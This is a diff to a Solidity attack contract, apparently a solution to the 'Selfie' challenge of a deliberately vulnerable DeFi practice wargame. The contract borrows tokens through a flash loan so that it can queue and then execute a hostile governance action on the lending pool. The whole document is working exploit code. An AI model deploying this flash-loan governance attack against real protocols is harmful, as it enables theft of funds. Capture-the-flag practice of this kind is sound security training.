@@ -10,16 +10,13 @@ contract AttackSelfie {
     address public _owner;
     SelfiePool public _pool;
     address public _token;
-    ISimpleGovernance public _governance;
     uint256 public _actionId;
 
-    constructor(address owner, address pool, address governance, address token) {
+    constructor(address owner, address pool, address token) {
         _owner = owner;
-        _token = token;
         _pool = SelfiePool(pool);
-        _governance = ISimpleGovernance(governance);
+        _token = token;
     }
-
 
     function attackQueueAction() public  {
         require(msg.sender == _owner, "not owner");
@@ -31,18 +28,17 @@ contract AttackSelfie {
         _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, _calldata);
     }
 
-
     function attackQueueExecute() public {
         require(msg.sender == _owner, "not owner");
 
-        _governance.executeAction(_actionId);
+        _pool.governance().executeAction(_actionId);
     }
-
 
     function onFlashLoan(address borrower, address token, uint256 amount, uint256 fee, bytes calldata _data) external returns (bytes32) {
         require(msg.sender == address(_pool), "not pool");
 
-        _actionId = _governance.queueAction(address(_pool), 0, _data);
+        _actionId = _pool.governance().queueAction(address(_pool), 0, _data);
+        DamnValuableTokenSnapshot(token).approve(address(_pool), amount);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
